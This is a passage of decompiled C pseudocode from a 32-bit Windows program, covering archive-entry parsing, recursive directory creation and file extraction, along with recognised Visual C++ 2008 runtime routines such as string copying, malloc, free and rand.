                    }
                    if (*local_148 != L'/') break;
                    local_148 = local_148 + 1;
                  }
                  local_3b8 = _wcsstr(local_148,u______00426370);
                  if (local_3b8 == (wchar_t *)0x0) break;
                  local_148 = local_3b8 + 4;
                }
                local_3b8 = _wcsstr(local_148,u______0042637c);
                if (local_3b8 == (wchar_t *)0x0) break;
                local_148 = local_3b8 + 4;
              }
              local_3b8 = _wcsstr(local_148,u______00426388);
              if (local_3b8 == (wchar_t *)0x0) break;
              local_148 = local_3b8 + 4;
            }
            local_3b8 = _wcsstr(local_148,u______00426394);
            if (local_3b8 == (wchar_t *)0x0) break;
            local_148 = local_3b8 + 4;
          }
          local_40c = local_148;
          local_410 = param_2 + 1;
          do {
            wVar2 = *local_40c;
            *(wchar_t *)local_410 = wVar2;
            local_40c = local_40c + 1;
            local_410 = (int *)((int)local_410 + 2);
          } while (wVar2 != L'\0');
          local_1c = local_380;
          uVar6 = local_380 & 0x40000000;
          local_156 = '\x01' - ((local_380 & 0x800000) != 0);
          local_2a = false;
          local_29 = false;
          local_155 = true;
          local_38 = local_3b4[0] >> 8;
          if ((((local_38 == 0) || (local_38 == 7)) || (local_38 == 0xb)) || (local_38 == 0xe)) {
            local_156 = (local_380 & 1) != 0;
            local_2a = (local_380 & 2) != 0;
            local_29 = (local_380 & 4) != 0;
            uVar6 = local_380 & 0x10;
            local_155 = (local_380 & 0x20) != 0;
          }
          local_11 = uVar6 != 0;
          param_2[0x83] = 0;
          if ((bool)local_11) {
            param_2[0x83] = param_2[0x83] | 0x10;
          }
          if ((bool)local_155 != false) {
            param_2[0x83] = param_2[0x83] | 0x20;
          }
          if ((bool)local_2a != false) {
            param_2[0x83] = param_2[0x83] | 2;
          }
          if (local_156 != '\0') {
            param_2[0x83] = param_2[0x83] | 1;
          }
          if ((bool)local_29 != false) {
            param_2[0x83] = param_2[0x83] | 4;
          }
          param_2[0x8a] = local_39c;
          param_2[0x8b] = local_398;
          local_24 = (ushort)local_3a4;
          local_30 = (ushort)((uint)local_3a4 >> 0x10);
          _Var11 = FUN_0040ec80(local_30,local_24);
          local_3e8 = _Var11.dwLowDateTime;
          local_154.dwLowDateTime = local_3e8;
          local_3e4 = _Var11.dwHighDateTime;
          local_154.dwHighDateTime = local_3e4;
          LocalFileTimeToFileTime(&local_154,&local_10);
          param_2[0x84] = local_10.dwLowDateTime;
          param_2[0x85] = local_10.dwHighDateTime;
          param_2[0x86] = local_10.dwLowDateTime;
          param_2[0x87] = local_10.dwHighDateTime;
          param_2[0x88] = local_10.dwLowDateTime;
          param_2[0x89] = local_10.dwHighDateTime;
          for (local_8 = 0; local_8 + 4U < local_20;
              local_8 = local_8 + 4 + (uint)*(byte *)((int)local_28 + local_8 + 2)) {
            local_3c4[0] = *(byte *)((int)local_28 + local_8);
            local_3c4[1] = *(undefined *)((int)local_28 + local_8 + 1);
            local_3c4[2] = 0;
            local_41c = &DAT_004263a0;
            local_420 = local_3c4;
            do {
              bVar1 = *local_420;
              bVar10 = bVar1 < *local_41c;
              if (bVar1 != *local_41c) {
LAB_0040f6d2:
                local_428 = (1 - (uint)bVar10) - (uint)(bVar10 != 0);
                goto LAB_0040f6dd;
              }
              if (bVar1 == 0) break;
              bVar1 = local_420[1];
              bVar10 = bVar1 < local_41c[1];
              if (bVar1 != local_41c[1]) goto LAB_0040f6d2;
              local_420 = local_420 + 2;
              local_41c = local_41c + 2;
            } while (bVar1 != 0);
            local_428 = 0;
LAB_0040f6dd:
            if (local_428 == 0) {
              bVar1 = *(byte *)((int)local_28 + local_8 + 4);
              local_3c0 = (uint)bVar1;
              local_3b9 = (bVar1 & 4) != 0;
              iVar7 = local_8 + 5;
              if ((bVar1 & 1) != 0) {
                iVar3 = local_8 + 6;
                iVar4 = local_8 + 7;
                iVar5 = local_8 + 8;
                local_8 = local_8 + 9;
                uVar12 = FUN_0040ec30(CONCAT13(*(undefined *)((int)local_28 + iVar5),
                                               CONCAT12(*(undefined *)((int)local_28 + iVar4),
                                                        CONCAT11(*(undefined *)
                                                                  ((int)local_28 + iVar3),
                                                                 *(undefined *)
                                                                  ((int)local_28 + iVar7)))));
                local_3f0 = (int)uVar12;
                param_2[0x88] = local_3f0;
                local_3ec = (int)((ulonglong)uVar12 >> 0x20);
                param_2[0x89] = local_3ec;
                iVar7 = local_8;
              }
              local_8 = iVar7;
              if ((bVar1 & 2) != 0) {
                puVar8 = (undefined *)((int)local_28 + local_8);
                iVar7 = local_8 + 1;
                iVar3 = local_8 + 2;
                iVar4 = local_8 + 3;
                local_8 = local_8 + 4;
                uVar12 = FUN_0040ec30(CONCAT13(*(undefined *)((int)local_28 + iVar4),
                                               CONCAT12(*(undefined *)((int)local_28 + iVar3),
                                                        CONCAT11(*(undefined *)
                                                                  ((int)local_28 + iVar7),*puVar8)))
                                     );
                local_3f8 = (int)uVar12;
                param_2[0x84] = local_3f8;
                local_3f4 = (int)((ulonglong)uVar12 >> 0x20);
                param_2[0x85] = local_3f4;
              }
              if (local_3b9 != '\0') {
                puVar8 = (undefined *)((int)local_28 + local_8);
                iVar7 = local_8 + 1;
                iVar3 = local_8 + 2;
                iVar4 = local_8 + 3;
                local_8 = local_8 + 4;
                uVar12 = FUN_0040ec30(CONCAT13(*(undefined *)((int)local_28 + iVar4),
                                               CONCAT12(*(undefined *)((int)local_28 + iVar3),
                                                        CONCAT11(*(undefined *)
                                                                  ((int)local_28 + iVar7),*puVar8)))
                                     );
                local_400 = (int)uVar12;
                param_2[0x86] = local_400;
                local_3fc = (int)((ulonglong)uVar12 >> 0x20);
                param_2[0x87] = local_3fc;
              }
              break;
            }
          }
          if (local_28 != (void *)0x0) {
            FUN_00410837(local_28);
          }
          piVar9 = (int *)((int)this + 8);
          for (iVar7 = 0x8c; iVar7 != 0; iVar7 = iVar7 + -1) {
            *piVar9 = *param_2;
            param_2 = param_2 + 1;
            piVar9 = piVar9 + 1;
          }
          *(int *)((int)this + 0x238) = param_1;
        }
        else {
          FUN_00410837(local_28);
        }
      }
    }
  }
  ___security_check_cookie_4(local_3c ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_0040f950(LPCWSTR param_1,undefined4 *param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  DWORD DVar4;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 *local_44c;
  undefined4 *local_438;
  WCHAR *local_42c;
  WCHAR *local_428;
  undefined4 local_424 [130];
  undefined4 *local_21c;
  undefined local_218 [4];
  WCHAR local_214 [260];
  uint local_c;
  undefined4 *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if ((param_1 != (LPCWSTR)0x0) && (DVar4 = GetFileAttributesW(param_1), DVar4 == 0xffffffff)) {
    CreateDirectoryW(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  }
  if (*(short *)param_2 != 0) {
    local_8 = param_2;
    for (local_21c = param_2; *(short *)local_21c != 0;
        local_21c = (undefined4 *)((int)local_21c + 2)) {
      if ((*(short *)local_21c == 0x2f) || (*(short *)local_21c == 0x5c)) {
        local_8 = local_21c;
      }
    }
    local_218 = (undefined  [4])local_8;
    if (local_8 != param_2) {
      _memcpy(local_424,param_2,((int)local_8 - (int)param_2 >> 1) << 1);
      *(undefined2 *)((int)local_424 + ((int)local_8 - (int)param_2 >> 1) * 2) = 0;
      FUN_0040f950(param_1,local_424);
      local_218 = (undefined  [4])((int)local_218 + 2);
    }
    local_214[0] = L'\0';
    if (param_1 != (LPCWSTR)0x0) {
      local_428 = param_1;
      local_42c = local_214;
      do {
        WVar2 = *local_428;
        *local_42c = WVar2;
        local_428 = local_428 + 1;
        local_42c = local_42c + 1;
      } while (WVar2 != L'\0');
    }
    local_438 = param_2;
    do {
      sVar3 = *(short *)local_438;
      local_438 = (undefined4 *)((int)local_438 + 2);
    } while (sVar3 != 0);
    local_44c = (undefined4 *)(local_218 + 2);
    do {
      psVar1 = (short *)((int)local_44c + 2);
      local_44c = (undefined4 *)((int)local_44c + 2);
    } while (*psVar1 != 0);
    puVar6 = param_2;
    for (uVar5 = (uint)((int)local_438 - (int)param_2) >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
      *local_44c = *puVar6;
      puVar6 = puVar6 + 1;
      local_44c = local_44c + 1;
    }
    for (uVar5 = (int)local_438 - (int)param_2 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
      *(undefined *)local_44c = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      local_44c = (undefined4 *)((int)local_44c + 1);
    }
    DVar4 = GetFileAttributesW(local_214);
    if (DVar4 == 0xffffffff) {
      CreateDirectoryW(local_214,(LPSECURITY_ATTRIBUTES)0x0);
    }
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_0040fba0(void *this,int param_1,undefined4 *param_2,void *param_3,int param_4)

{
  short sVar1;
  void *pvVar2;
  char local_6a0;
  undefined4 *local_694;
  undefined4 *local_690;
  char local_68c;
  DWORD local_680;
  BOOL local_67c;
  char local_675;
  uint local_674;
  undefined4 *local_670;
  undefined4 local_66c;
  WCHAR local_464 [262];
  undefined4 *local_258;
  undefined4 *local_254;
  char local_24d;
  undefined4 *local_24c;
  char local_246;
  char local_245;
  uint local_244;
  int local_240;
  int local_23c [131];
  uint local_30;
  FILETIME local_2c;
  FILETIME local_24;
  FILETIME local_1c [2];
  uint local_c;
  undefined4 *local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  if (((param_4 == 3) || (param_4 == 2)) || (param_4 == 1)) {
    if (param_4 == 3) {
      if (param_1 != *(int *)((int)this + 4)) {
        if (*(int *)((int)this + 4) != -1) {
                    // WARNING: Load size is inaccurate
          FUN_0040eb60(*this);
        }
        *(undefined4 *)((int)this + 4) = 0xffffffff;
                    // WARNING: Load size is inaccurate
        if (*(int *)(*this + 4) <= param_1) goto LAB_0041023d;
                    // WARNING: Load size is inaccurate
        if (param_1 < *(int *)(*this + 0x10)) {
                    // WARNING: Load size is inaccurate
          FUN_0040e110(*this);
        }
                    // WARNING: Load size is inaccurate
        while (*(int *)(*this + 0x10) < param_1) {
                    // WARNING: Load size is inaccurate
          FUN_0040e180(*this);
        }
                    // WARNING: Load size is inaccurate
        FUN_0040e4c0(*this,*(char **)((int)this + 0x23c));
        *(int *)((int)this + 4) = param_1;
      }
                    // WARNING: Load size is inaccurate
      local_244 = FUN_0040e740(*this,param_2,param_3,&local_245);
      if ((int)local_244 < 1) {
                    // WARNING: Load size is inaccurate
        FUN_0040eb60(*this);
        *(undefined4 *)((int)this + 4) = 0xffffffff;
      }
    }
    else {
      if (*(int *)((int)this + 4) != -1) {
                    // WARNING: Load size is inaccurate
        FUN_0040eb60(*this);
      }
      *(undefined4 *)((int)this + 4) = 0xffffffff;
                    // WARNING: Load size is inaccurate
      if (param_1 < *(int *)(*this + 4)) {
                    // WARNING: Load size is inaccurate
        if (param_1 < *(int *)(*this + 0x10)) {
                    // WARNING: Load size is inaccurate
          FUN_0040e110(*this);
        }
                    // WARNING: Load size is inaccurate
        while (*(int *)(*this + 0x10) < param_1) {
                    // WARNING: Load size is inaccurate
          FUN_0040e180(*this);
        }
        FUN_0040efa0(this,param_1,local_23c);
        if ((local_30 & 0x10) == 0) {
          if (param_4 == 1) {
            local_8 = param_2;
          }
          else {
            local_254 = param_2;
            local_258 = param_2;
            for (local_670 = param_2; *(short *)local_670 != 0;
                local_670 = (undefined4 *)((int)local_670 + 2)) {
              if ((*(short *)local_670 == 0x2f) || (*(short *)local_670 == 0x5c)) {
                local_258 = (undefined4 *)((int)local_670 + 2);
              }
            }
            local_690 = param_2;
            local_694 = &local_66c;
            do {
              sVar1 = *(short *)local_690;
              *(short *)local_694 = sVar1;
              local_690 = (undefined4 *)((int)local_690 + 2);
              local_694 = (undefined4 *)((int)local_694 + 2);
            } while (sVar1 != 0);
            if (local_258 == local_254) {
              local_66c._0_2_ = 0;
            }
            else {
              *(undefined2 *)((int)&local_66c + ((int)local_258 - (int)local_254 >> 1) * 2) = 0;
            }
            if ((((short)local_66c == 0x2f) || ((short)local_66c == 0x5c)) ||
               (((short)local_66c != 0 && (local_66c._2_2_ == 0x3a)))) {
              local_6a0 = '\x01';
            }
            else {
              local_6a0 = '\0';
            }
            local_24d = local_6a0;
            if (local_6a0 == '\0') {
              wsprintfW(local_464,u__s_s_s_004263b0,(int)this + 0x244,&local_66c,local_258);
              FUN_0040f950((LPCWSTR)((int)this + 0x244),&local_66c);
            }
            else {
              wsprintfW(local_464,u__s_s_004263a4,&local_66c,local_258);
              FUN_0040f950((LPCWSTR)0x0,&local_66c);
            }
            local_8 = (undefined4 *)
                      CreateFileW(local_464,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,local_30,
                                  (HANDLE)0x0);
          }
          if (local_8 != (undefined4 *)0xffffffff) {
                    // WARNING: Load size is inaccurate
            FUN_0040e4c0(*this,*(char **)((int)this + 0x23c));
            if (*(int *)((int)this + 0x240) == 0) {
              pvVar2 = operator_new(0x4000);
              *(void **)((int)this + 0x240) = pvVar2;
            }
            local_240 = 0;
            do {
              if (local_240 != 0) goto LAB_004101ea;
                    // WARNING: Load size is inaccurate
              local_674 = FUN_0040e740(*this,*(void **)((int)this + 0x240),(void *)0x4000,&local_675
                                      );
              if (local_674 == 0xffffff96) {
                local_240 = 0x1000;
                goto LAB_004101ea;
              }
              if ((int)local_674 < 0) {
                local_240 = 0x5000000;
                goto LAB_004101ea;
              }
              if ((0 < (int)local_674) &&
                 (local_67c = WriteFile(local_8,*(LPCVOID *)((int)this + 0x240),local_674,&local_680
                                        ,(LPOVERLAPPED)0x0), local_67c == 0)) {
                local_240 = 0x400;
                goto LAB_004101ea;
              }
              if (local_675 != '\0') goto LAB_004101ea;
            } while (local_674 != 0);
            local_240 = 0x5000000;
LAB_004101ea:
            if (local_240 == 0) {
              SetFileTime(local_8,&local_24,&local_2c,local_1c);
            }
            if (param_4 != 1) {
              CloseHandle(local_8);
            }
                    // WARNING: Load size is inaccurate
            FUN_0040eb60(*this);
          }
        }
        else if (param_4 != 1) {
          local_24c = param_2;
          if (((*(short *)param_2 == 0x2f) || (*(short *)param_2 == 0x5c)) ||
             ((*(short *)param_2 != 0 && (*(short *)((int)param_2 + 2) == 0x3a)))) {
            local_68c = '\x01';
          }
          else {
            local_68c = '\0';
          }
          local_246 = local_68c;
          if (local_68c == '\0') {
            FUN_0040f950((LPCWSTR)((int)this + 0x244),param_2);
          }
          else {
            FUN_0040f950((LPCWSTR)0x0,param_2);
          }
        }
      }
    }
  }
LAB_0041023d:
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __fastcall FUN_00410250(int *param_1)

{
  if (param_1[1] != -1) {
    FUN_0040eb60(*param_1);
  }
  param_1[1] = -1;
  if (*param_1 != 0) {
    FUN_0040dbf0((void **)*param_1);
  }
  *param_1 = 0;
  return 0;
}



undefined4 * __cdecl FUN_004102a0(LPCWSTR param_1,undefined4 param_2,int param_3,char *param_4)

{
  void *this;
  undefined4 *puVar1;
  int **unaff_FS_OFFSET;
  undefined4 *local_30;
  int *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0042187b;
  local_10 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = (int *)&local_10;
  this = operator_new(0x44c);
  local_8 = 0;
  if (this == (void *)0x0) {
    local_30 = (undefined4 *)0x0;
  }
  else {
    local_30 = FUN_0040ed00(this,param_4);
  }
  local_8 = 0xffffffff;
  DAT_0042d154 = FUN_0040ee50(local_30,param_1,param_2,param_3);
  if (DAT_0042d154 == 0) {
    puVar1 = (undefined4 *)operator_new(8);
    *puVar1 = 1;
    puVar1[1] = local_30;
  }
  else {
    if (local_30 != (undefined4 *)0x0) {
      FUN_004103a0(local_30,1);
    }
    puVar1 = (undefined4 *)0x0;
  }
  *unaff_FS_OFFSET = local_10;
  return puVar1;
}



void * __thiscall FUN_004103a0(void *this,uint param_1)

{
  FUN_0040ede0(this);
  if ((param_1 & 1) != 0) {
    FUN_00410837(this);
  }
  return this;
}



void __cdecl FUN_004103d0(LPCWSTR param_1,undefined4 param_2,char *param_3)

{
  FUN_004102a0(param_1,param_2,3,param_3);
  return;
}



undefined4 __cdecl FUN_004103f0(int *param_1,int param_2,int *param_3)

{
  *param_3 = 0;
  *(undefined2 *)(param_3 + 1) = 0;
  param_3[0x8b] = 0;
  if (param_1 == (int *)0x0) {
    DAT_0042d154 = 0x10000;
  }
  else if (*param_1 == 1) {
    DAT_0042d154 = FUN_0040efa0((void *)param_1[1],param_2,param_3);
  }
  else {
    DAT_0042d154 = 0x80000;
  }
  return DAT_0042d154;
}



undefined4 __cdecl
FUN_00410480(int *param_1,int param_2,undefined4 *param_3,void *param_4,int param_5)

{
  if (param_1 == (int *)0x0) {
    DAT_0042d154 = 0x10000;
  }
  else if (*param_1 == 1) {
    DAT_0042d154 = FUN_0040fba0((void *)param_1[1],param_2,param_3,param_4,param_5);
  }
  else {
    DAT_0042d154 = 0x80000;
  }
  return DAT_0042d154;
}



void __cdecl FUN_004104f0(int *param_1,int param_2,undefined4 *param_3,void *param_4)

{
  FUN_00410480(param_1,param_2,param_3,param_4,3);
  return;
}



undefined4 __cdecl FUN_00410510(int *param_1)

{
  int *this;
  
  if (param_1 == (int *)0x0) {
    DAT_0042d154 = 0x10000;
  }
  else if (*param_1 == 1) {
    this = (int *)param_1[1];
    DAT_0042d154 = FUN_00410250(this);
    if (this != (int *)0x0) {
      FUN_004103a0(this,1);
    }
    FUN_00410837(param_1);
  }
  else {
    DAT_0042d154 = 0x80000;
  }
  return DAT_0042d154;
}



void GetAdaptersInfo(void)

{
                    // WARNING: Could not recover jumptable at 0x004105a6. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_0042a044) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        do {
          wVar1 = *_Src;
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_004105dd;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_004105dd:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _wcsrchr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  if (*pwVar2 != _Ch) {
    pwVar2 = (wchar_t *)0x0;
  }
  return pwVar2;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        wVar1 = *_Src;
        *pwVar3 = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
        pwVar3 = pwVar3 + 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_00410686;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_00410686:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



void __cdecl FUN_004106d3(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2008 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x0041072f:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x0041072f;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



// Library Function - Single Match
//  public: __thiscall std::bad_alloc::bad_alloc(void)
// 
// Library: Visual Studio 2008 Release

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this)

{
  exception::exception((exception *)this,&PTR_s_bad_allocation_0042a000,1);
  *(undefined ***)this = &PTR_FUN_00422290;
  return this;
}



undefined4 * __thiscall FUN_0041078e(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_00422290;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00410837(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_004107b5(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_00422290;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined local_10 [12];
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_0042b9cc & 1) == 0) {
    _DAT_0042b9cc = _DAT_0042b9cc | 1;
    std::bad_alloc::bad_alloc((bad_alloc *)&DAT_0042b9c0);
    _atexit((_func_4879 *)&LAB_004218b1);
  }
  FUN_004107b5(local_10,(exception *)&DAT_0042b9c0);
  __CxxThrowException_8(local_10,&DAT_00428930);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



void FUN_00410837(void *param_1)

{
  _free(param_1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2008 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_0042e8c4) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_00410888();
  }
  return local_20;
}



void FUN_00410888(void)

{
  FUN_00413064(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_0042be74 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      if (DAT_0042e8b8 == 1) {
        dwBytes = _Size;
        if (_Size == 0) {
          dwBytes = 1;
        }
LAB_00410900:
        piVar1 = (int *)HeapAlloc(DAT_0042be74,0,dwBytes);
      }
      else if ((DAT_0042e8b8 != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0))
      {
        sVar3 = _Size;
        if (_Size == 0) {
          sVar3 = 1;
        }
        dwBytes = sVar3 + 0xf & 0xfffffff0;
        goto LAB_00410900;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_0042c1c4 == 0) {
        piVar1 = __errno();
        *piVar1 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  return (void *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2008 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  
  if (_Memory != (void *)0x0) {
    if (DAT_0042e8b8 == 3) {
      __lock(4);
      puVar1 = (uint *)___sbh_find_block((int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_004109b1();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_0042be74,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_004109b1(void)

{
  FUN_00413064(4);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004289c8;
  uStack_c = 0x4109f5;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_00410aa5();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_0042a044,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_00410aa5(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
